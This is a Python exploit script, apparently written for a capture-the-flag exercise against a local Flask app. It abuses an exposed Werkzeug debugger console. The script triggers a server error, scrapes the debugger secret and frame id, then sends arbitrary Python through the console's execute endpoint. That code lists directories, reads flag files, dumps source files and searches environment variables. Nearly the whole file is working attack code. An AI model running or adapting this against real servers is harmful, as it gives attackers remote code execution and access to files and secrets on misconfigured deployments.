def setup_session():
    """Setup a session with the cookie"""
    session = requests.Session()
    session.cookies.set("session", SESSION_COOKIE, domain="127.0.0.1", path="/")
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Security Research)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    })
    return session

def trigger_login_error():
    """Trigger a login error to activate the debugger"""
    print("[*] Triggering login error...")
    
    session = setup_session()
    
    # Try to login without required fields - this should trigger KeyError
    try:
        resp = session.post(
            f"{BASE_URL}/login",
            data={"test": "value"},  # Missing username and password
            allow_redirects=False,
            timeout=10
        )
        
        print(f"Response status: {resp.status_code}")
        print(f"Response length: {len(resp.text)} characters")
        
        if resp.status_code == 500:
            print("[+] Got 500 error - debugger should be active")
            return resp.text, session
        elif resp.status_code == 200:
            print("[?] Got 200 - checking for debugger in response")
            return resp.text, session
        else:
            print(f"[-] Unexpected status: {resp.status_code}")
            return None, session
            
    except Exception as e:
        print(f"Error triggering error: {e}")
        return None, None

def extract_debugger_info(error_html):
    """Extract debugger console URL and parameters from error page"""
    print("\n[*] Extracting debugger information...")
    
    # Look for debugger references
    debugger_refs = re.findall(r'__debugger__[^\"\'\s&]+', error_html)
    print(f"Found {len(debugger_refs)} debugger references")
    
    for ref in debugger_refs[:5]:
        print(f"  - {ref}")
    
    # Look for console iframe
    console_matches = re.findall(r'<iframe[^>]*src=[\"\']([^\"\']*/console[^\"\']*)[\"\']', error_html, re.IGNORECASE)
    if console_matches:
        console_url = console_matches[0]
        print(f"[+] Console iframe found: {console_url}")
        return console_url
    
    # Look for console links
    console_links = re.findall(r'/console[^\"\'\s]+', error_html)
    if console_links:
        console_url = console_links[0]
        console_url = console_url.replace('&amp;', '&')  # Decode HTML entities
        print(f"[+] Console link found: {console_url}")
        return console_url
    
    # Look for execute links
    execute_links = re.findall(r'cmd=execute[^\"\'\s]+', error_html)
    if execute_links:
        execute_url = execute_links[0]
        execute_url = execute_url.replace('&amp;', '&')
        print(f"[+] Execute link found: {execute_url}")
        return f"/console?{execute_url}"
    
    return None

def access_console(session, console_url):
    """Access the debugger console"""
    print(f"\n[*] Accessing console: {console_url}")
    
    if not console_url.startswith('http'):
        if console_url.startswith('/'):
            full_url = f"{BASE_URL}{console_url}"
        else:
            full_url = f"{BASE_URL}/{console_url}"
    else:
        full_url = console_url
    
    try:
        resp = session.get(full_url, timeout=10)
        print(f"Console response status: {resp.status_code}")
        print(f"Console response length: {len(resp.text)} characters")
        
        if resp.status_code == 200:
            # Look for SECRET
            secret_matches = re.findall(r'SECRET\s*=\s*[\"\']([^\"\']+)[\"\']', resp.text)
            if secret_matches:
                secret = secret_matches[0]
                print(f"[+] Found SECRET: {secret}")
            
            # Look for EVALEX
            evalex_matches = re.findall(r'EVALEX\s*=\s*(true|false)', resp.text)
            if evalex_matches:
                evalex = evalex_matches[0]
                print(f"[+] Found EVALEX: {evalex}")
            
            # Look for frame
            frame_matches = re.findall(r'frm=([0-9]+)', resp.text)
            if frame_matches:
                frame = frame_matches[0]
                print(f"[+] Found frame: {frame}")
                return resp.text, secret, frame
            
            return resp.text, secret_matches[0] if secret_matches else None, None
        
        return None, None, None
        
    except Exception as e:
        print(f"Error accessing console: {e}")
        return None, None, None

def execute_code(session, frame, secret, code):
    """Execute code in debugger console"""
    print(f"\n[*] Attempting code execution...")
    print(f"Frame: {frame}")
    print(f"Code: {code}")
    
    # Proper Werkzeug debugger execute endpoint
    execute_url = f"{BASE_URL}/console"
    params = {
        "__debugger__": "yes",
        "cmd": "execute",
        "frm": frame,
        "s": secret,
        "code": code
    }
    
    print(f"Execute URL: {execute_url}")
    print(f"Params: {params}")
    
    try:
        # Use GET request as per Werkzeug debugger specification
        resp = session.get(execute_url, params=params, timeout=15)
        
        print(f"Execute response status: {resp.status_code}")
        print(f"Execute response type: {resp.headers.get('Content-Type', 'unknown')}")
        
        if resp.status_code == 200:
            # Werkzeug debugger returns a JSON-like response wrapped in HTML comments
            print(f"Response preview: {resp.text[:500]}")
            
            # Look for actual output (should be in browser's console, not HTTP response)
            # The debugger returns the current console state, not the execution result
            
            # Check if execution worked by looking for error indicators
            if "Traceback" in resp.text or "Error" in resp.text[:200]:
                print("[-] Execution seems to have failed")
                return False
            else:
                print("[+] Execution appeared to succeed (no errors)")
                return True
        
        return False
        
    except Exception as e:
        print(f"Error executing code: {e}")
        return False

def search_for_flag(session, frame, secret):
    """Search for flag using debugger console"""
    print("\n" + "=" * 60)
    print("SEARCHING FOR FLAG")
    print("=" * 60)
    
    search_commands = [
        # Test basic execution
        "print('testing execution')",
        
        # List current directory
        "import os; print('CWD:', os.getcwd()); print('FILES:', os.listdir('.'))",
        
        # Search for flag files
        "import os; print([f for f in os.listdir('.') if 'flag' in f.lower()])",
        
        # Try to read flag.txt
        "import os; print(open('flag.txt').read()) if os.path.exists('flag.txt') else print('no flag.txt')",
        
        # Try to read FLAG.txt
        "import os; print(open('FLAG.txt').read()) if os.path.exists('FLAG.txt') else print('no FLAG.txt')",
        
        # Check parent directory
        "import os; print([f for f in os.listdir('..') if 'flag' in f.lower()])",
        
        # Try reading all Python files
        "import os; files = [f for f in os.listdir('.') if f.endswith('.py')]; [print(f'=== {f} ===', open(f).read()[:200]) for f in files if os.path.getsize(f) < 10000]",
        
        # Check environment
        "import os; print([v for k, v in os.environ.items() if 'flag' in k.lower()])",
    ]
    
    for cmd in search_commands:
        print(f"\n[*] Executing: {cmd[:60]}...")
        if execute_code(session, frame, secret, cmd):
            print("[+] Command executed without errors")
        else:
            print("[-] Command failed")

def alternative_exploit():
    """Try alternative exploitation methods"""
    print("\n" + "=" * 60)
    print("TRYING ALTERNATIVE EXPLOITATION")
    print("=" * 60)
    
    session = setup_session()
    
    # Method 1: Direct console access with secret
    print("\n[*] Method 1: Direct console with secret")
    console_url = f"{BASE_URL}/console?__debugger__=yes&s={SECRET}"
    resp = session.get(console_url)
    print(f"Status: {resp.status_code}")
    
    if resp.status_code == 200:
        # Extract frame if available
        frame_match = re.search(r'frm=([0-9]+)', resp.text)
        if frame_match:
            frame = frame_match.group(1)
            print(f"[+] Frame extracted: {frame}")
            
            # Try to execute
            execute_url = f"{BASE_URL}/console?__debugger__=yes&cmd=execute&frm={frame}&s={SECRET}&code=print('test')"
            execute_resp = session.get(execute_url)
            print(f"Execute status: {execute_resp.status_code}")
            print(f"Execute response: {execute_resp.text[:300]}")
    
    # Method 2: Use login GET with error parameter
    print("\n[*] Method 2: Trigger error via parameters")
    error_urls = [
        f"{BASE_URL}/login?__debugger__=yes&cmd=execute&s={SECRET}&code=print('test')",
        f"{BASE_URL}/transactions?__debugger__=yes&cmd=execute&s={SECRET}&code=print('test')"
    ]
    
    for url in error_urls:
        try:
            print(f"Testing: {url}")
            resp = session.get(url)
            print(f"Status: {resp.status_code}")
            if resp.status_code == 200:
                print(f"Response: {resp.text[:300]}")
        except Exception as e:
            print(f"Error: {e}")

def main():
    print("Werkzeug Debugger Exploitation - Complete Analysis")
    print("=" * 70)
    print(f"Target: {BASE_URL}")
    print(f"Initial Secret: {SESSION_COOKIE[:20]}...")
    print()
    
    # Step 1: Trigger error
    error_html, session = trigger_login_error()
    
    if not error_html:
        print("[-] Failed to trigger error")
        return
    
    # Step 2: Extract debugger info
    console_url = extract_debugger_info(error_html)
    
    if not console_url:
        print("[-] Could not extract console URL")
        alternative_exploit()
        return
    
    # Step 3: Access console
    console_html, secret, frame = access_console(session, console_url)
    
    if not console_html:
        print("[-] Could not access console")
        return
    
    # Update secret if found
    if secret and secret != SECRET:
        print(f"[+] Updated secret from {SECRET} to {secret}")
    
    print(f"[+] Using frame: {frame}, secret: {secret}")
    
    # Try manual frame extraction if not found
    if not frame:
        print("[-] Frame not automatically extracted, trying manual extraction...")
        frame_match = re.search(r'frm=([0-9]+)', console_html)
        if frame_match:
            frame = frame_match.group(1)
            print(f"[+] Manually extracted frame: {frame}")
        else:
            frame = "0"  # Default frame
            print(f"[-] Could not extract frame, using default: {frame}")
    
    # Step 4: Execute code and search for flag
    search_for_flag(session, frame, secret or SECRET)
    
    # Additional attempts
    print("\n" + "=" * 70)
    print("ADDITIONAL EXPLOITATION ATTEMPTS")
    print("=" * 70)
    alternative_exploit()
    
    print("\n[*] Complete analysis finished")

if __name__ == "__main__":
    main()
